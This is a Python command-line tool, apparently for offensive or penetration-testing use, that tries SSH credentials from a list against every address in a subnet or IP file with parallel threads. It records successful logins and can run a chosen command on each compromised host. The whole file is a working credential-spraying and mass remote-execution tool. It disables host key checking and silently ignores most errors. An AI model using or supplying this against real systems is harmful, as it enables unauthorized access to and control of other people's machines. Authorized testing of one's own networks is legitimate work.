#!/usr/bin/env python3
import argparse
import sys
import ipaddress
import socket
import threading
import logging

from paramiko import SSHClient, AutoAddPolicy
from paramiko.ssh_exception import AuthenticationException


lock = threading.Lock()
logging.getLogger("paramiko.transport").setLevel(logging.CRITICAL)

def write_print(string, fobj=None, end="\n"):
    lock.acquire()
    print(string, end=end)
    if fobj is not None:
        fobj.write(string + end)
    lock.release()

def chunks(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def ssh_connect(out_file, addrs, user, password, execute, timeout):
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())

    for ip in addrs:
        try:
            ssh.connect(ip, username=user, password=password, timeout=timeout,
                        banner_timeout=200,
                        auth_timeout=60,
                        look_for_keys=False,
                        allow_agent=False)
        except AuthenticationException:
            write_print(f"[!] {ip} Could not authenticate")
            continue
        except socket.timeout:
            write_print(f"[!] {ip} Timeout exceeded")
            continue
        except Exception as e:
            #write_print(f"[!] {ip} Unknown error")
            #write_print(e)
            continue

        string = f"[+] ssh://{ip} with {user}:{password}\n"
        if execute is not None:
            _, stdout, _ = ssh.exec_command(execute)
            exit_code = stdout.channel.recv_exit_status()
            for line in stdout:
                string += line.strip() + "\n"
        write_print(string, out_file)
        ssh.close()

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--subnet", "-s")
    group.add_argument("--subnet-file", "-f")

    group2 = parser.add_mutually_exclusive_group(required=True)
    group2.add_argument("--execute", "-x")
    group2.add_argument("--verify", action="store_true")


    group3 = parser.add_mutually_exclusive_group(required=True)
    group3.add_argument("--credentials", "-c", nargs=2, metavar=("user", "password"))
    group3.add_argument("--credsf", "-C")


    parser.add_argument("--output", "-o", default=None)
    parser.add_argument("--threads", "-T", type=int, default=4)
    parser.add_argument("--timeout", "-t", type=int, default=4)
    args = parser.parse_args()

    if args.output:
        out_file = open(args.output, "w+")
    else:
        out_file = None

    command = args.execute
    if args.verify:
        command = None

    if args.subnet:
        ip_addrs = [str(ip) for ip in ipaddress.IPv4Network(args.subnet)]
    else:
        with open(args.subnet_file, "r") as f:
            ip_addrs = [ip.strip() for ip in f.readlines()]

    credentials = list()
    if args.credentials:
        credentials.append(args.credentials)
    else:
        with open(args.credsf, "r") as file:
            for c in file.readlines():
                credentials.append([x.strip() for x in c.split(":")])

    try:
        for creds in credentials:
            user, password = creds
            write_print(f"[*] Attempting login with {user}:{password}")
            threads = list()
            for i in list(chunks(ip_addrs, len(ip_addrs)//args.threads + 1)):
                x = threading.Thread(target=ssh_connect, args=(out_file, i,
                                                               user,
                                                               password,
                                                               command,
                                                               args.timeout))
                threads.append(x)
                x.setDaemon(True)
                x.start()

            for thread in threads:
                thread.join()
    except (KeyboardInterrupt, SystemExit):
        print(f"[+] Bye")

    if out_file:
        out_file.close()
    sys.exit()

if __name__ == '__main__':
    main()
